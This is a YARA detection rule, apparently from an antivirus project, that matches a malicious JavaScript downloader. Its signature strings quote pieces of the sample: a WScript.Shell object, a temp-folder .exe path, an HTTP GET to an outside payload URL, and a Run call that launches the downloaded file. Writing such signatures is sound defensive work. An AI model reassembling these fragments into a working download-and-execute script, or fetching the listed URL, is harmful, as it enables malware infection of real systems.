rule sig_20160328_d7aac641d2fefcdc9a0496178f75cdbc {
  meta:
    description = "datamaliciousorder - file 20160328_d7aac641d2fefcdc9a0496178f75cdbc.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7c22e428ccaf9d5f0e4ef0ebd4903d4111fb56f4dfb9894c02aa8fe2d8aaebfd"

  strings:
    $s1  = "function Ctlopuyez() {return Mqrpd[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"nzbOLRnj.exe\";};" fullword ascii
    $s2  = "Hfkwlcow[Msucwgzsw](\"GET\", \"http://extragames.besaba.com/b3ysfa\", false);" fullword ascii
    $s3  = "do {WScript[Dxmlcmaqvn](Rwrfu() * 11)} while (Hfkwlcow[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Dzdmvd(Ojpegpxgsy, Iogbl){return Ojpegpxgsy - Iogbl;};" fullword ascii
    $s5  = "var Mqrpd = function Tuqydgrkuc() {return WScript[Mpfhldzk](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Vasahou(Feocifd){Mqrpd[\"Run\"](Feocifd, Pcogwapr, Pcogwapr);};" fullword ascii
    $s7  = "Qegsbbcmqt = true; " fullword ascii
    $s8  = "function Sbgluwu(){return Rwmpdynmz;};" fullword ascii
    $s9  = "function Rwrfu(){return 22;};" fullword ascii
    $s10 = "var Rqkykux = new this[\"Date\"]();" fullword ascii
    $s11 = " while (Shgtro){" fullword ascii
    $s12 = "function Nimjgppnv(){return Mpfhldzk;};" fullword ascii
    $s13 = "var Cwhludo = false;" fullword ascii
    $s14 = "function Fdwskbjxbj(Gtnwqvl) {var Ujwnkamm = (1, 2, 3, 4, 5, Gtnwqvl); return Ujwnkamm;};" fullword ascii
    $s15 = "function Ivfft()" fullword ascii
    $s16 = "return Dzdmvd(Gzbeybtnb, Wqanzobwl);" fullword ascii
    $s17 = "var Qegsbbcmqt = false;" fullword ascii
    $s18 = "function Wrhlu() {return ((Vdhjbcau == true) && (Vdhjbcau == Qegsbbcmqt)) ? 1 : Pcogwapr;};" fullword ascii
    $s19 = "var Vdhjbcau = false;" fullword ascii
    $s20 = "Vdhjbcau = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}